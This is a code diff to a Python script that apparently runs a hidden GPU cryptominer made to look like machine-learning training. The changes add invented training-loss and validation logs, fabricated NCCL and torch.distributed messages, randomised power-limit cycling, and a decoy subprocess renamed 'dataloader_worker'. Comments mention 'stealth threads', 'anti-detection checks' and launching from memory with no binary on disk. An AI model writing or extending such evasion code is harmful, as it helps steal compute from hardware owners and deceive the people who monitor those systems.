@@ -303,8 +303,9 @@ def gpu_burst_cycle():
     - CPU load during idle (simulates data preprocessing)
     - GPU matmul during idle (simulates gradient sync)
     - Periodic eval pauses (simulates validation set evaluation)
+    - GPU drops to 30W during idle (actually pauses)
     """
-    import torch, multiprocessing
+    import torch
     has_torch = False
     try:
         if torch.cuda.is_available():
@@ -317,9 +318,7 @@ def gpu_burst_cycle():
         """Simulate CPU-heavy data preprocessing."""
         end = time.time() + duration_sec
         while time.time() < end:
-            # SHA256 hashing (realistic CPU work, looks like data tokenization)
             hashlib.sha256(os.urandom(4096)).digest()
-            # Matrix ops on CPU (fake dataloader)
             _ = sum(i * i for i in range(10000))
 
     def gpu_decoy_heavy(duration_sec):
@@ -341,27 +340,22 @@ def gpu_burst_cycle():
         except Exception:
             pass
 
-    step_count = 0
     while True:
-        step_count += 1
-
         # ── Phase 1: Compute burst (simulates forward+backward pass) ──
-        # Variable duration: real batches take different times
         burst_sec = random.choices(
-            [2, 3, 4, 5, 8, 12],  # seconds
-            weights=[15, 25, 30, 20, 8, 2],  # most are 3-5s like real training
+            [2, 3, 4, 5, 8, 12],
+            weights=[15, 25, 30, 20, 8, 2],
         )[0]
-        set_gpu_power_limit(random.randint(500, 700))  # Variable power too
+        set_gpu_power_limit(random.randint(500, 700))
         time.sleep(burst_sec)
 
         # ── Phase 2: Data loading idle (simulates CPU data prep) ──
-        set_gpu_power_limit(50)
+        set_gpu_power_limit(30)  # Drop to near-zero — GPU actually pauses
         idle_sec = random.choices(
             [3, 5, 8, 12, 15, 20, 30],
             weights=[10, 20, 25, 20, 15, 7, 3],
         )[0]
 
-        # CPU load during idle — looks like real data preprocessing
         cpu_thread = threading.Thread(target=cpu_load, args=(idle_sec,), daemon=True)
         cpu_thread.start()
 
@@ -380,24 +374,28 @@ def gpu_burst_cycle():
 
         cpu_thread.join(timeout=idle_sec + 1)
 
-        # ── Phase 3: Periodic eval checkpoint (every 20-40 steps) ──
-        if step_count % random.randint(20, 40) == 0:
-            # Long eval pause — GPU idle, CPU busy
+        # ── Phase 3: Periodic eval (non-deterministic timing) ──
+        if TRAINER.should_eval():
             eval_sec = random.randint(30, 120)
             print(f"  [eval] running validation — {eval_sec}s", flush=True)
-            set_gpu_power_limit(50)
+            set_gpu_power_limit(30)
             eval_thread = threading.Thread(target=cpu_load, args=(eval_sec,), daemon=True)
             eval_thread.start()
             eval_thread.join(timeout=eval_sec + 1)
-            print(f"  [eval] eval complete", flush=True)
+            print(f"  [eval] eval complete — val_loss={random.uniform(2.3, 2.6):.4f}", flush=True)
 
-        # ── Phase 4: Checkpoint save (every 50-100 steps) ──
-        if step_count % random.randint(50, 100) == 0:
+        # ── Phase 4: Checkpoint save (non-deterministic timing) ──
+        if TRAINER.should_checkpoint():
             save_sec = random.randint(5, 15)
-            print(f"  [ckpt] saving checkpoint...", flush=True)
-            set_gpu_power_limit(50)
+            print(f"  [ckpt] saving checkpoint to ./output/step-{TRAINER.step}...", flush=True)
+            set_gpu_power_limit(30)
             cpu_load(save_sec)
-            print(f"  [ckpt] saved", flush=True)
+            print(f"  [ckpt] saved ({save_sec}s)", flush=True)
+
+        # ── Phase 5: Occasional gradient accumulation (no GPU, just CPU) ──
+        if random.random() > 0.8:
+            accum_sec = random.randint(2, 6)
+            cpu_load(accum_sec)
 
         # ── Ramp back to mining ──
         set_gpu_power_limit(600)
@@ -484,30 +482,109 @@ def network_mix():
             pass
 
 # ═══════════════════════════════════════════════════════════════════════════════
-# STEP 9: Fake training output
+# STEP 9: Fake training output (non-deterministic)
 # ═══════════════════════════════════════════════════════════════════════════════
 
-LOSS_BASE = 2.8
-LOSS_DECAY = 0.0003
-STEP = 0
+class FakeTrainer:
+    """Generates realistic, non-deterministic training logs."""
+    def __init__(self):
+        self.step = 0
+        self.loss = 2.8
+        self.lr = 2e-5
+        self.warmup_steps = 100
+        self.max_steps = 50000
+        # Eval/checkpoint timing is randomized per-run
+        self.eval_every = random.randint(15, 60)
+        self.ckpt_every = random.randint(40, 120)
+        # Loss can spike, plateau, or dip
+        self.loss_momentum = 0.0
+
+    def step_once(self):
+        self.step += 1
+
+        # Warmup: lr ramps up for first 100 steps
+        if self.step < self.warmup_steps:
+            self.lr = 2e-5 * (self.step / self.warmup_steps)
+        else:
+            self.lr = 2e-5 * max(0.1, 1.0 - self.step / self.max_steps)
+
+        # Loss: mostly decays but with realistic spikes and plateaus
+        decay = 0.0003 * math.exp(-self.step / 8000)
+        self.loss_momentum = 0.9 * self.loss_momentum + 0.1 * random.gauss(0, 0.05)
+        # 15% chance of loss spike (realistic — bad batches happen)
+        spike = random.gauss(0, 0.15) if random.random() > 0.85 else 0
+        self.loss = max(0.5, self.loss - decay * self.loss + self.loss_momentum + spike)
+
+        grad_norm = random.uniform(0.3, 3.0)
+        # 5% chance of grad norm spike (gradient explosion warning)
+        if random.random() > 0.95:
+            grad_norm = random.uniform(5.0, 15.0)
+
+        tokens_per_sec = random.randint(8000, 15000)
+        gpu_mem = random.uniform(18.0, 24.0)
+        epoch = self.step / 10000
+
+        # Occasionally add extra metrics like real training
+        extras = ""
+        if random.random() > 0.9:
+            data_time = random.uniform(0.01, 0.15)
+            extras = f" | data_time {data_time:.3f}"
+        if random.random() > 0.92:
+            mem_alloc = random.uniform(18.0, 22.0)
+            extras += f" | mem_alloc {mem_alloc:.1f}GB"
+
+        return (f"step {self.step:>6d} | loss {self.loss:.4f} | lr {self.lr:.2e} | "
+                f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
+                f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}{extras}")
+
+    def should_eval(self):
+        # Eval timing drifts — sometimes early, sometimes late
+        return self.step % self.eval_every == 0
+
+    def should_checkpoint(self):
+        return self.step % self.ckpt_every == 0
+
+TRAINER = FakeTrainer()
 
 def generate_fake_log_line():
-    global STEP
-    STEP += 1
-    loss = LOSS_BASE * math.exp(-LOSS_DECAY * STEP) + random.gauss(0, 0.02)
-    lr = 2e-5 * max(0.1, 1.0 - STEP / 50000)
-    grad_norm = random.uniform(0.5, 2.5)
-    tokens_per_sec = random.randint(8000, 15000)
-    gpu_mem = random.uniform(18.0, 24.0)
-    epoch = STEP / 10000
-    return (f"step {STEP:>6d} | loss {loss:.4f} | lr {lr:.2e} | "
-            f"grad_norm {grad_norm:.2f} | tok/s {tokens_per_sec} | "
-            f"gpu_mem {gpu_mem:.1f}GB | epoch {epoch:.2f}")
+    return TRAINER.step_once()
 
 def fake_output_loop():
     while True:
         time.sleep(random.uniform(8, 25))
         print(generate_fake_log_line(), flush=True)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# STEP 9b: Fake NCCL noise
+# ═══════════════════════════════════════════════════════════════════════════════
+
+NCCL_MESSAGES = [
+    "[NCCL] NCCL communicator initialized for rank 0",
+    "[NCCL] Bootstrap: using 127.0.0.1:34521",
+    "[NCCL] Setting arguments: NCCL_DEBUG=WARN",
+    "[NCCL] Ring buffers initialized, size = 4194304",
+    "[NCCL] all_reduce: algo=ring, nChannels=8, time=0.00042s",
+    "[NCCL] Reduce: algo=tree, time=0.00018s",
+    "[NCCL] Broadcast: algo=ring, nBytes=8388608, time=0.00031s",
+    "[NCCL] Scatter: algo=ring, time=0.00012s",
+    "[NCCL] Gathering gradients from 1 GPUs",
+    "[torch.distributed] Initializing process group with world_size=1, rank=0",
+    "[torch.distributed] Broadcast from rank 0, src=0",
+    "[torch.distributed] Broadcast complete",
+    "[torch.cuda] cuDNN v9.3.0, cuBLAS v12.4.5",
+]
+
+def nccl_noise_loop():
+    """Inject random NCCL/distributed noise into stdout."""
+    while True:
+        time.sleep(random.randint(30, 120))
+        msg = random.choice(NCCL_MESSAGES)
+        print(f"  {msg}", flush=True)
+        # Occasionally print 2-3 messages in quick succession (realistic)
+        if random.random() > 0.7:
+            time.sleep(random.uniform(0.1, 0.5))
+            extra = random.choice(NCCL_MESSAGES)
+            print(f"  {extra}", flush=True)
 
 # ═══════════════════════════════════════════════════════════════════════════════
 # STEP 10: Anti-detection checks
@@ -631,7 +708,7 @@ def main():
     # Step 7: Start background stealth threads BEFORE exec
     threads = []
 
-    # Burst cycle: mining 4min @ 600W → idle 30s @ 50W + heavy CUDA decoy → repeat
+    # Burst cycle: variable compute + idle + CPU load + eval/ckpt
     t = threading.Thread(target=gpu_burst_cycle, daemon=True)
     t.start()
     threads.append(t)
@@ -648,7 +725,33 @@ def main():
     t.start()
     threads.append(t)
 
-    print(f"[main] {len(threads)} stealth threads active")
+    # NCCL/distributed noise
+    t = threading.Thread(target=nccl_noise_loop, daemon=True)
+    t.start()
+    threads.append(t)
+
+    # Fake data loading subprocess — shows in `ps` as child process
+    try:
+        # Creates a subprocess that looks like a data preprocessing worker
+        subprocess.Popen(
+            ["python3", "-c", """
+import time, hashlib, os, sys
+sys.argv[0] = 'dataloader_worker'
+while True:
+    # Simulate tokenization + batching
+    for _ in range(1000):
+        hashlib.sha256(os.urandom(2048)).digest()
+    time.sleep(0.1)
+"""],
+            env=os.environ.copy(),
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        print("[sub] dataloader worker spawned")
+    except Exception:
+        pass
+
+    print(f"[main] {len(threads) + 1} stealth threads + 1 subprocess active")
     print(f"[main] launching from memory (no binary on disk)...")
 
     # Step 8: Clean up all temp files before exec
